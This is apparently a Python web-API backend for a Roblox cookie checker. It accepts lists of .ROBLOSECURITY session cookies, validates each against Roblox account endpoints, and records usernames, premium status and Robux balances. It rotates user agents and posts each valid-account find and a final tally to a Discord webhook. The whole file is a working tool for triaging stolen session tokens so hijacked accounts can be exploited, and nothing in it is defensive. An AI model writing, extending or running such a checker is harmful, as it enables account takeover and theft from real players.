# api/check.py
from http.server import BaseHTTPRequestHandler
import json, requests, time, threading, random
from datetime import datetime, timezone
import os

# Global state untuk kontrol dari web
checker_state = {
    'is_checking': False,
    'current_thread': None,
    'results': [],
    'live_data': {
        'total_checked': 0,
        'valid_count': 0,
        'invalid_count': 0,
        'total_robux': 0,
        'premium_count': 0,
        'start_time': None,
        'current_status': 'Idle',
        'progress': 0,
        'current_cookie': 0,
        'total_cookies': 0
    },
    'webhook_url': None,
    'check_interval': 60,
    'max_workers': 3,
    'timeout': 45,
    'retry_count': 2
}

class handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests untuk status dan dashboard"""
        if self.path == '/api/status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            status_response = {
                'status': checker_state['live_data']['current_status'],
                'is_checking': checker_state['is_checking'],
                'progress': checker_state['live_data']['progress'],
                'checked': checker_state['live_data']['total_checked'],
                'valid': checker_state['live_data']['valid_count'],
                'invalid': checker_state['live_data']['invalid_count'],
                'total_robux': checker_state['live_data']['total_robux'],
                'premium': checker_state['live_data']['premium_count'],
                'current_cookie': checker_state['live_data']['current_cookie'],
                'total_cookies': checker_state['live_data']['total_cookies'],
                'start_time': checker_state['live_data']['start_time']
            }
            
            self.wfile.write(json.dumps(status_response).encode())
            return
            
        elif self.path.startswith('/api/results'):
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            # Return last 20 results
            recent_results = checker_state['results'][-20:] if checker_state['results'] else []
            self.wfile.write(json.dumps(recent_results).encode())
            return
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests untuk kontrol"""
        if self.path == '/api/start':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            # Ambil cookies dari request
            cookies = data.get("cookies", [])
            webhook_url = data.get("webhook_url", "")
            
            if not cookies:
                self.send_error(400, "No cookies provided")
                return
            
            # Start checking dalam thread terpisah
            if not checker_state['is_checking']:
                checker_state['webhook_url'] = webhook_url
                checker_state['is_checking'] = True
                checker_state['live_data'] = {
                    'total_checked': 0,
                    'valid_count': 0,
                    'invalid_count': 0,
                    'total_robux': 0,
                    'premium_count': 0,
                    'start_time': time.time(),
                    'current_status': 'Running',
                    'progress': 0,
                    'current_cookie': 1,
                    'total_cookies': len(cookies)
                }
                checker_state['results'] = []
                
                # Start checking thread
                thread = threading.Thread(target=run_check, args=(cookies,))
                thread.daemon = True
                thread.start()
                checker_state['current_thread'] = thread
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'success': True,
                    'message': 'Checker started!',
                    'total_cookies': len(cookies)
                }).encode())
            else:
                self.send_response(400)
                self.send_header('Content-type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    'success': False,
                    'message': 'Checker is already running!'
                }).encode())
        
        elif self.path == '/api/stop':
            checker_state['is_checking'] = False
            checker_state['live_data']['current_status'] = 'Stopped'
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({
                'success': True,
                'message': 'Checker stopped!'
            }).encode())
        
        elif self.path == '/api/test':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            cookie = data.get("cookie", "")
            webhook_url = data.get("webhook_url", "")
            
            if not cookie:
                self.send_error(400, "No cookie provided")
                return
            
            # Test single cookie
            result = check_single_cookie(cookie, 0)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(result).encode())
        
        else:
            self.send_response(404)
            self.end_headers()

# Fungsi utama checking (di-background)
def run_check(cookies):
    """Run checking in background thread"""
    for i, cookie in enumerate(cookies):
        if not checker_state['is_checking']:
            break
        
        # Update progress
        checker_state['live_data']['current_cookie'] = i + 1
        checker_state['live_data']['progress'] = int(((i + 1) / len(cookies)) * 100)
        
        # Check cookie
        result = check_single_cookie(cookie, i)
        checker_state['results'].append(result)
        
        # Update live data
        checker_state['live_data']['total_checked'] += 1
        if result['status'] == 'valid':
            checker_state['live_data']['valid_count'] += 1
            checker_state['live_data']['total_robux'] += result.get('robux', 0)
            if result.get('premium', False):
                checker_state['live_data']['premium_count'] += 1
        else:
            checker_state['live_data']['invalid_count'] += 1
        
        # Kirim ke webhook jika ada
        if checker_state['webhook_url']:
            send_to_webhook(result, checker_state['webhook_url'])
        
        # Delay 1 detik
        if i < len(cookies) - 1 and checker_state['is_checking']:
            time.sleep(1)
    
    # Selesai
    if checker_state['is_checking']:
        checker_state['is_checking'] = False
        checker_state['live_data']['current_status'] = 'Completed'
        
        # Kirim laporan final ke webhook
        if checker_state['webhook_url'] and checker_state['results']:
            send_final_report(checker_state['results'], checker_state['webhook_url'])

def check_single_cookie(cookie, cookie_id=0):
    """Check single cookie (sama seperti di script asli)"""
    headers = {
        'User-Agent': get_user_agent(),
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'Accept': 'application/json',
    }
    
    result = {
        'cookie_id': cookie_id,
        'status': 'unknown',
        'username': 'Unknown',
        'user_id': 'Unknown',
        'display_name': 'Unknown',
        'premium': False,
        'robux': 0,
        'error': None,
        'cookie_value': cookie[:50] + '...' if len(cookie) > 50 else cookie,
        'timestamp': datetime.now(timezone.utc).isoformat()
    }
    
    try:
        # Cek auth
        auth_url = "https://users.roblox.com/v1/users/authenticated"
        response = requests.get(auth_url, headers=headers, timeout=30)
        
        if response.status_code == 200:
            user_data = response.json()
            result['username'] = user_data.get('name', 'Unknown')
            result['user_id'] = user_data.get('id', 'Unknown')
            result['display_name'] = user_data.get('displayName', 'Unknown')
            result['status'] = 'valid'
            
            # Cek premium
            try:
                premium_url = "https://premiumfeatures.roblox.com/v1/users/premium/membership"
                premium_response = requests.get(premium_url, headers=headers, timeout=10)
                if premium_response.status_code == 200:
                    premium_data = premium_response.json()
                    result['premium'] = premium_data.get('isPremium', False)
            except:
                pass
            
            # Cek robux
            try:
                balance_url = "https://economy.roblox.com/v1/user/currency"
                balance_response = requests.get(balance_url, headers=headers, timeout=10)
                if balance_response.status_code == 200:
                    balance_data = balance_response.json()
                    result['robux'] = balance_data.get('robux', 0)
            except:
                pass
                
        elif response.status_code == 401:
            result['status'] = 'invalid'
            result['error'] = 'Unauthorized (Cookie expired/invalid)'
        elif response.status_code == 403:
            result['status'] = 'invalid'
            result['error'] = 'Forbidden (Security restriction)'
        else:
            result['status'] = 'error'
            result['error'] = f'HTTP {response.status_code}'
            
    except requests.exceptions.Timeout:
        result['status'] = 'error'
        result['error'] = 'Request timeout'
    except requests.exceptions.ConnectionError:
        result['status'] = 'error'
        result['error'] = 'Connection error'
    except Exception as e:
        result['status'] = 'error'
        result['error'] = str(e)
    
    return result

def get_user_agent():
    """Get random user agent"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    ]
    return random.choice(user_agents)

def send_to_webhook(result, webhook_url):
    """Send result to Discord webhook"""
    try:
        color = 0x00ff00 if result['status'] == 'valid' else 0xff0000
        
        embed = {
            "title": "✅ VALID COOKIE" if result['status'] == 'valid' else "❌ INVALID COOKIE",
            "color": color,
            "fields": [
                {
                    "name": "👤 Username",
                    "value": f"`{result['username']}`",
                    "inline": True
                },
                {
                    "name": "💰 Robux",
                    "value": f"`{result['robux']:,}`",
                    "inline": True
                },
                {
                    "name": "📛 Status",
                    "value": f"`{result['status']}`",
                    "inline": True
                }
            ],
            "footer": {
                "text": f"Cookie #{result['cookie_id']+1} • {datetime.now().strftime('%H:%M:%S')}"
            }
        }
        
        if result['error']:
            embed["fields"].append({
                "name": "⚠️ Error",
                "value": f"`{result['error']}`",
                "inline": False
            })
        
        payload = {
            "embeds": [embed],
            "username": "Cookie Checker Live"
        }
        
        requests.post(webhook_url, json=payload, timeout=5)
    except:
        pass

def send_final_report(results, webhook_url):
    """Send final report to webhook"""
    try:
        valid_count = len([r for r in results if r['status'] == 'valid'])
        invalid_count = len([r for r in results if r['status'] != 'valid'])
        total_robux = sum([r.get('robux', 0) for r in results if r['status'] == 'valid'])
        
        embed = {
            "title": "📊 CHECK COMPLETED",
            "color": 0x3498db,
            "description": f"**✅ Valid:** {valid_count}\n**❌ Invalid:** {invalid_count}\n**💰 Total Robux:** {total_robux:,}",
            "footer": {
                "text": f"Total cookies: {len(results)} • {datetime.now().strftime('%Y-%m-%d %H:%M')}"
            }
        }
        
        payload = {
            "embeds": [embed],
            "username": "Final Report"
        }
        
        requests.post(webhook_url, json=payload, timeout=5)
    except:
        pass